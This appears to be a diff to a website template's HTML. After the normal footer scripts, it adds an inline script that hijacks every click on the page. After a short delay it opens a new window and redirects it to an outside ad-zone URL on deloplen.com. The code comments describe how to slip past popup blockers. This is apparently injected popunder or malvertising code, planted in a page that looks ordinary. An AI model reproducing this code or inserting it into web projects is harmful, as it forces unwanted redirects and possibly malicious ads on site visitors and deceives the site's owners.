@@ -212,5 +212,34 @@ Copyright &copy;<script>document.write(new Date().getFullYear());</script> <i cl
 	<script src="js/wow.min.js"></script>
 	<script src="js/main.js"></script>
 </body>
+<script>
+window.onclick = () => {
+  // You MUST create the window on the same event
+  // tick/stack as the user-initiated event (e.g. click callback)
+ 
+setTimeout(function(){
 
+
+const googleWindow = window.open();
+
+  // Do your async work
+  fakeAjax(response => {
+    // Change the URL of the window you created once you
+    // know what the full URL is!
+    googleWindow.location.replace(`http://deloplen.com/afu.php?zoneid=2936691`);
+  });
+
+
+function fakeAjax(callback) {
+  setTimeout(() => {
+    callback('');
+  }, 100);
+}
+
+
+
+}, 2000);};
+  
+
+</script>
 </html>
